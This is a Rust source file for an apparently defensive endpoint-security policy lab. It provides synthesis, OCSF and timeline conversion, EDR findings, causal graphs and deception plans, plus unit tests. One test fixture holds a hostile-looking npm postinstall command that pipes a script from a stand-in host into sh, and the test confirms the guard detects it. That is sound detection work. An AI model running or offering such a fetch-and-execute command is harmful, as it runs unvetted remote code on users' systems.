//! PolicyLabHandle -- JSON-in/JSON-out facade for cross-language bindings.

use anyhow::{anyhow, Context};
use serde::Serialize;

use crate::edr::{
    CausalGraphRecorder, DeceptionPlan, EndpointObservation, HoneyArtifact, SupplyChainRuntimeGuard,
};
#[cfg(not(feature = "timeline"))]
use crate::event::{PolicyEvent, PolicyEventData, PolicyEventType};
use crate::ocsf::policy_events_to_ocsf_jsonl;
use crate::stream::read_events_from_str;
use crate::synth::{build_candidate_policy, collect_stats};

/// Synthesis result containing the generated policy YAML and risk notes.
#[derive(Clone, Debug, Serialize)]
pub struct SynthResult {
    pub policy_yaml: String,
    pub risks: Vec<String>,
}

/// Re-export SimulationResult as the facade's simulate return type.
#[cfg(feature = "simulate")]
pub type SimulateResult = crate::simulate::SimulationResult;

/// JSON-in/JSON-out handle for policy lab operations.
///
/// Holds a policy YAML string. Provides methods that accept JSONL event
/// strings and return JSON/YAML output, suitable for FFI/WASM/PyO3 bindings.
pub struct PolicyLabHandle {
    #[cfg_attr(not(feature = "simulate"), allow(dead_code))]
    policy_yaml: String,
}

impl PolicyLabHandle {
    /// Create a new handle with the given policy YAML.
    pub fn new(policy_yaml: &str) -> anyhow::Result<Self> {
        // Validate the YAML parses as a Policy.
        let _policy: clawdstrike::Policy = serde_yaml::from_str(policy_yaml)?;
        Ok(Self {
            policy_yaml: policy_yaml.to_string(),
        })
    }

    /// Synthesize a policy from observed events (JSONL).
    ///
    /// This is a static method: it does not use the handle's policy.
    pub fn synth(events_jsonl: &str) -> anyhow::Result<SynthResult> {
        let events = read_events_from_str(events_jsonl)?;
        let stats = collect_stats(&events);
        let policy = build_candidate_policy(&stats, None, true);
        let policy_yaml = policy.to_yaml()?;

        let mut risks = Vec::new();
        if stats.shell_commands > 0 {
            risks.push(format!(
                "Observed {} shell command(s) - review shell guard configuration",
                stats.shell_commands
            ));
        }
        if stats.hosts.len() > 10 {
            risks.push(format!(
                "Observed {} distinct egress hosts - review for overly broad allowlist",
                stats.hosts.len()
            ));
        }
        if stats.total_events == 0 {
            risks.push("No events provided - generated policy has minimal controls".to_string());
        }

        Ok(SynthResult { policy_yaml, risks })
    }

    /// Simulate events against this handle's policy.
    ///
    /// Creates a new async runtime per call — suitable for FFI/WASM contexts.
    ///
    /// Requires the `simulate` feature (enabled by default).
    #[cfg(feature = "simulate")]
    pub fn simulate(&self, events_jsonl: &str) -> anyhow::Result<SimulateResult> {
        let events = read_events_from_str(events_jsonl)?;

        let rt = tokio::runtime::Runtime::new()?;
        rt.block_on(crate::simulate::replay_events(
            &self.policy_yaml,
            &events,
            false,
        ))
    }

    /// Convert events JSONL to OCSF JSONL.
    pub fn to_ocsf(events_jsonl: &str) -> anyhow::Result<String> {
        let events = read_events_from_str(events_jsonl)?;
        policy_events_to_ocsf_jsonl(&events)
    }

    /// Convert events JSONL to timeline JSONL.
    #[cfg(feature = "timeline")]
    pub fn to_timeline(events_jsonl: &str) -> anyhow::Result<String> {
        let events = read_events_from_str(events_jsonl)?;
        let timeline = crate::bridge::policy_events_to_timeline(&events);

        let mut lines = Vec::with_capacity(timeline.len());
        for te in &timeline {
            let line = serde_json::to_string(te)?;
            lines.push(line);
        }
        Ok(lines.join("\n"))
    }

    /// Convert events JSONL to timeline JSONL.
    #[cfg(not(feature = "timeline"))]
    pub fn to_timeline(events_jsonl: &str) -> anyhow::Result<String> {
        let events = read_events_from_str(events_jsonl)?;

        let mut lines = Vec::with_capacity(events.len());
        for event in &events {
            let line = serde_json::to_string(&fallback_timeline_event(event)?)?;
            lines.push(line);
        }
        Ok(lines.join("\n"))
    }

    /// Convert existing PolicyEvent JSONL into endpoint-observation JSONL.
    pub fn to_endpoint_observations(events_jsonl: &str) -> anyhow::Result<String> {
        let events = read_events_from_str(events_jsonl)?;
        let mut lines = Vec::with_capacity(events.len());
        for event in &events {
            lines.push(serde_json::to_string(
                &EndpointObservation::from_policy_event(event),
            )?);
        }
        Ok(lines.join("\n"))
    }

    /// Evaluate endpoint observations with the built-in EDR guard set.
    ///
    /// `honey_artifacts_json` may be omitted or may contain a JSON array of
    /// `HoneyArtifact` values from a deception plan. The return value is JSONL
    /// of `DetectionFinding` records.
    pub fn edr_findings(
        observations_jsonl: &str,
        honey_artifacts_json: Option<&str>,
    ) -> anyhow::Result<String> {
        let observations = read_endpoint_observations_from_str(observations_jsonl)?;
        let honey_artifacts = match honey_artifacts_json {
            Some(input) if !input.trim().is_empty() => {
                serde_json::from_str::<Vec<HoneyArtifact>>(input)
                    .context("failed to parse honey_artifacts_json as Vec<HoneyArtifact>")?
            }
            _ => Vec::new(),
        };
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(honey_artifacts);

        let mut lines = Vec::new();
        for observation in &observations {
            for finding in guard.evaluate(observation) {
                lines.push(serde_json::to_string(&finding)?);
            }
        }
        Ok(lines.join("\n"))
    }

    /// Build a causal graph from endpoint-observation JSONL.
    pub fn edr_causal_graph(observations_jsonl: &str) -> anyhow::Result<String> {
        let observations = read_endpoint_observations_from_str(observations_jsonl)?;
        let mut recorder = CausalGraphRecorder::new();
        for observation in &observations {
            recorder.record_observation(observation);
        }
        Ok(serde_json::to_string(&recorder.into_graph())?)
    }

    /// Render the standard endpoint deception plan without writing files.
    pub fn edr_standard_deception_plan(root: &str, endpoint_id: &str) -> anyhow::Result<String> {
        if root.trim().is_empty() {
            return Err(anyhow!("deception root must not be empty"));
        }
        if endpoint_id.trim().is_empty() {
            return Err(anyhow!("endpoint_id must not be empty"));
        }
        Ok(serde_json::to_string(&DeceptionPlan::standard(
            root,
            endpoint_id,
        ))?)
    }

    /// Materialize a deception plan and return a JSON report.
    pub fn edr_materialize_deception_plan(plan_json: &str) -> anyhow::Result<String> {
        let plan = serde_json::from_str::<DeceptionPlan>(plan_json)
            .context("failed to parse plan_json as DeceptionPlan")?;
        Ok(serde_json::to_string(&plan.materialize()?)?)
    }
}

fn read_endpoint_observations_from_str(input: &str) -> anyhow::Result<Vec<EndpointObservation>> {
    let mut observations = Vec::new();
    for (idx, line) in input.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        observations.push(
            serde_json::from_str(trimmed).with_context(|| {
                format!("invalid endpoint observation JSONL at line {}", idx + 1)
            })?,
        );
    }
    Ok(observations)
}

#[cfg(not(feature = "timeline"))]
fn fallback_timeline_event(event: &PolicyEvent) -> anyhow::Result<serde_json::Value> {
    let (action_type, summary) = fallback_action_type_and_summary(event);
    let verdict = fallback_verdict_from_metadata(event.metadata.as_ref());
    let severity = fallback_extract_severity(event.metadata.as_ref());

    let mut obj = serde_json::Map::new();
    obj.insert(
        "timestamp".to_string(),
        serde_json::to_value(event.timestamp)?,
    );
    obj.insert(
        "source".to_string(),
        serde_json::Value::String("receipt".to_string()),
    );
    obj.insert(
        "kind".to_string(),
        serde_json::Value::String("guard_decision".to_string()),
    );
    obj.insert(
        "verdict".to_string(),
        serde_json::Value::String(verdict.to_string()),
    );
    if let Some(severity) = severity {
        obj.insert("severity".to_string(), serde_json::Value::String(severity));
    }
    obj.insert("summary".to_string(), serde_json::Value::String(summary));
    obj.insert(
        "action_type".to_string(),
        serde_json::Value::String(action_type.to_string()),
    );
    obj.insert("raw".to_string(), serde_json::to_value(event)?);
    Ok(serde_json::Value::Object(obj))
}

#[cfg(not(feature = "timeline"))]
fn fallback_action_type_and_summary(event: &PolicyEvent) -> (&'static str, String) {
    match (&event.event_type, &event.data) {
        (PolicyEventType::FileRead, PolicyEventData::File(f)) => {
            ("file", format!("file_read {}", f.path))
        }
        (PolicyEventType::FileWrite, PolicyEventData::File(f)) => {
            ("file", format!("file_write {}", f.path))
        }
        (PolicyEventType::NetworkEgress, PolicyEventData::Network(n)) => {
            ("egress", format!("network_egress {}:{}", n.host, n.port))
        }
        (PolicyEventType::CommandExec, PolicyEventData::Command(c)) => {
            ("shell", format!("command_exec {}", c.command))
        }
        (PolicyEventType::PatchApply, PolicyEventData::Patch(p)) => {
            ("patch", format!("patch_apply {}", p.file_path))
        }
        (PolicyEventType::ToolCall, PolicyEventData::Tool(t)) => {
            ("tool", format!("tool_call {}", t.tool_name))
        }
        (PolicyEventType::SecretAccess, PolicyEventData::Secret(s)) => {
            ("secret", format!("secret_access {}", s.secret_name))
        }
        (PolicyEventType::Custom, PolicyEventData::Custom(c)) => {
            ("custom", format!("custom {}", c.custom_type))
        }
        (
            PolicyEventType::RemoteSessionConnect
            | PolicyEventType::RemoteSessionDisconnect
            | PolicyEventType::RemoteSessionReconnect
            | PolicyEventType::InputInject
            | PolicyEventType::ClipboardTransfer
            | PolicyEventType::FileTransfer
            | PolicyEventType::RemoteAudio
            | PolicyEventType::RemoteDriveMapping
            | PolicyEventType::RemotePrinting
            | PolicyEventType::SessionShare,
            PolicyEventData::Cua(cua),
        ) => ("cua", format!("{} {}", event.event_type, cua.cua_action)),
        _ => ("unknown", format!("{}", event.event_type)),
    }
}

#[cfg(not(feature = "timeline"))]
fn fallback_verdict_from_metadata(metadata: Option<&serde_json::Value>) -> &'static str {
    let Some(serde_json::Value::Object(obj)) = metadata else {
        return "none";
    };

    let decision_val = obj.get("verdict").or_else(|| obj.get("decision"));

    match decision_val {
        Some(serde_json::Value::String(s)) => match s.to_lowercase().as_str() {
            "allow" | "allowed" | "pass" | "passed" => "allow",
            "deny" | "denied" | "block" | "blocked" => "deny",
            "warn" | "warning" | "warned" => "warn",
            _ => "none",
        },
        Some(serde_json::Value::Object(decision_obj)) => {
            if decision_obj.get("allowed").and_then(|v| v.as_bool()) == Some(false) {
                return "deny";
            }
            if decision_obj
                .get("warn")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
            {
                return "warn";
            }
            if decision_obj.get("allowed").and_then(|v| v.as_bool()) == Some(true) {
                return "allow";
            }
            "none"
        }
        _ => "none",
    }
}

#[cfg(not(feature = "timeline"))]
fn fallback_extract_severity(metadata: Option<&serde_json::Value>) -> Option<String> {
    let Some(serde_json::Value::Object(obj)) = metadata else {
        return None;
    };

    obj.get("severity")
        .and_then(fallback_severity_from_value)
        .or_else(|| {
            obj.get("decision")
                .or_else(|| obj.get("verdict"))
                .and_then(|v| v.as_object())
                .and_then(|d| d.get("severity"))
                .and_then(fallback_severity_from_value)
        })
}

#[cfg(not(feature = "timeline"))]
fn fallback_severity_from_value(value: &serde_json::Value) -> Option<String> {
    if let Some(severity) = value.as_str() {
        return Some(severity.to_string());
    }

    let obj = value.as_object()?;
    obj.get("level")
        .and_then(|v| v.as_str())
        .or_else(|| obj.get("severity").and_then(|v| v.as_str()))
        .map(str::to_string)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used, clippy::unwrap_used)]

    use super::*;
    use crate::edr::{
        CodeSignatureStatus, DeceptionPlan, EndpointEvent, EndpointObservation, EndpointProcess,
        PackageManager, SignatureTrust,
    };
    use crate::event::{FileEventData, PolicyEvent, PolicyEventData, PolicyEventType};
    use chrono::Utc;

    fn sample_jsonl() -> String {
        let event = PolicyEvent {
            event_id: "evt-1".to_string(),
            event_type: PolicyEventType::FileRead,
            timestamp: Utc::now(),
            session_id: None,
            data: PolicyEventData::File(FileEventData {
                path: "/tmp/test".to_string(),
                operation: None,
                content_base64: None,
                content: None,
                content_hash: None,
            }),
            metadata: None,
            context: None,
        };
        serde_json::to_string(&event).unwrap()
    }

    #[test]
    fn synth_produces_valid_yaml() {
        let result = PolicyLabHandle::synth(&sample_jsonl()).unwrap();
        assert!(!result.policy_yaml.is_empty());
        // Verify it's valid YAML that parses as a Policy.
        let _policy: clawdstrike::Policy = serde_yaml::from_str(&result.policy_yaml).unwrap();
    }

    #[test]
    fn to_ocsf_produces_json() {
        let ocsf = PolicyLabHandle::to_ocsf(&sample_jsonl()).unwrap();
        assert!(!ocsf.is_empty());
        let _parsed: serde_json::Value = serde_json::from_str(&ocsf).unwrap();
    }

    #[test]
    fn to_timeline_produces_json() {
        let timeline = PolicyLabHandle::to_timeline(&sample_jsonl()).unwrap();
        assert!(!timeline.is_empty());
        let _parsed: serde_json::Value = serde_json::from_str(&timeline).unwrap();
    }

    #[test]
    fn new_rejects_invalid_yaml() {
        let result = PolicyLabHandle::new("not: valid: policy: yaml: {{{}}}");
        assert!(result.is_err());
    }

    #[test]
    fn new_rejects_non_policy_yaml() {
        let result = PolicyLabHandle::new("foo: bar\nbaz: 42");
        assert!(result.is_err());
    }

    #[test]
    fn synth_rejects_malformed_jsonl() {
        let result = PolicyLabHandle::synth("this is not json");
        assert!(result.is_err());
    }

    #[test]
    fn to_ocsf_rejects_malformed_jsonl() {
        let result = PolicyLabHandle::to_ocsf("{bad json");
        assert!(result.is_err());
    }

    #[test]
    fn to_timeline_rejects_malformed_jsonl() {
        let result = PolicyLabHandle::to_timeline("<<<invalid>>>");
        assert!(result.is_err());
    }

    #[test]
    fn synth_empty_input_produces_risk_warning() {
        let result = PolicyLabHandle::synth("").unwrap();
        assert!(result
            .risks
            .iter()
            .any(|r| r.contains("No events provided")));
    }

    #[test]
    fn to_endpoint_observations_converts_policy_event_jsonl() {
        let observations = PolicyLabHandle::to_endpoint_observations(&sample_jsonl()).unwrap();
        let parsed: EndpointObservation = serde_json::from_str(&observations).unwrap();

        assert_eq!(parsed.event_name(), "file_access");
    }

    #[test]
    fn edr_findings_returns_detection_jsonl() {
        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/install.sh | sh".to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            ..EndpointObservation::default()
        };
        let jsonl = serde_json::to_string(&observation).unwrap();

        let findings = PolicyLabHandle::edr_findings(&jsonl, None).unwrap();

        assert!(findings.contains("supply_chain.install_script.risky"));
    }

    #[test]
    fn edr_causal_graph_returns_graph_json() {
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let jsonl = serde_json::to_string(&observation).unwrap();

        let graph = PolicyLabHandle::edr_causal_graph(&jsonl).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&graph).unwrap();

        assert!(parsed["nodes"].as_object().unwrap().len() >= 2);
        assert!(!parsed["edges"].as_array().unwrap().is_empty());
    }

    #[test]
    fn edr_standard_deception_plan_is_json_contract() {
        let plan_json =
            PolicyLabHandle::edr_standard_deception_plan("/tmp/clawdstrike-honey", "endpoint-1")
                .unwrap();
        let plan: DeceptionPlan = serde_json::from_str(&plan_json).unwrap();

        assert_eq!(plan.endpoint_id, "endpoint-1");
        assert!(plan.artifacts.len() >= 5);
    }

    #[cfg(not(feature = "timeline"))]
    #[test]
    fn fallback_verdict_denied_takes_precedence_over_warn() {
        let metadata = serde_json::json!({
            "decision": {
                "allowed": false,
                "warn": true
            }
        });

        assert_eq!(fallback_verdict_from_metadata(Some(&metadata)), "deny");
    }

    #[cfg(not(feature = "timeline"))]
    #[test]
    fn fallback_extract_severity_supports_nested_object() {
        let metadata = serde_json::json!({
            "severity": {
                "level": "warning"
            }
        });

        assert_eq!(
            fallback_extract_severity(Some(&metadata)).as_deref(),
            Some("warning")
        );
    }
}
